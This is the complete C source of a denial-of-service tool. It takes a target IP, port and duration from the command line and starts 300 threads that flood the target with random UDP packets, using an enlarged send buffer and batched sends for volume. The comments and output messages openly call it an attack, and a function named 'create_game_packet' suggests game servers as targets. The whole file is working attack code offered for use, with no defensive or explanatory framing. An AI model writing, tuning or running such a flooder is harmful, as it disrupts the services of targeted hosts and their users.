#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/time.h>

#define MAX_THREADS 300  // Increased to 300 threads
#define BUFFER_SIZE 100  // Size of each UDP packet
#define BATCH_SEND 9     // Number of packets to send per batch

// Structure to pass data to each thread
typedef struct {
    char *ip;           // Target IP address
    int port;           // Target port
    int duration;       // Attack duration in seconds
    int thread_id;      // Unique ID for each thread
} thread_data_t;

// Function to fill a buffer with random data
void create_game_packet(char *buffer, int buffer_size) {
    for (int i = 0; i < buffer_size; i++) {
        buffer[i] = (char)(rand() % 256);  // Fill with random bytes
    }
}

// Function executed by each thread to send UDP packets
void *udp_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    struct sockaddr_in target;
    char buffer[BUFFER_SIZE];

    // Seed the random number generator with a unique value per thread
    srand(time(NULL) + data->thread_id);

    // Create the UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Optimize socket buffer size for sending large quantities of packets
    int optval = 1 << 20;  // 1 MB buffer
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));

    // Set up target address information
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &target.sin_addr);

    // Generate the packet content outside the loop
    create_game_packet(buffer, BUFFER_SIZE);

    // Get the time when the flood should stop
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    time_t end_time = start_time.tv_sec + data->duration;

    // Loop until the duration expires
    while (1) {
        gettimeofday(&current_time, NULL);
        if (current_time.tv_sec >= end_time) break;

        // Send a batch of packets to reduce system call overhead
        for (int i = 0; i < BATCH_SEND; i++) {
            if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
                perror("sendto failed");
                break;
            }
        }
    }

    // Close the socket and exit the thread
    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {  // We expect only 3 arguments: IP, port, duration
        printf("Usage: %s <target IP> <port> <time duration>\n", argv[0]);
        exit(1);
    }

    // Parse command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = MAX_THREADS;  // Use 300 threads by default

    printf("Starting UDP flood to %s:%d with %d threads for %d seconds.\n", ip, port, num_threads, duration);

    // Create an array of threads and data for each thread
    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];

    // Launch threads
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].ip = ip;
        thread_data[i].port = port;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)&thread_data[i]) != 0) {
            perror("pthread_create failed");
            exit(1);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack stopped by sharp.\n");

    return 0;
}
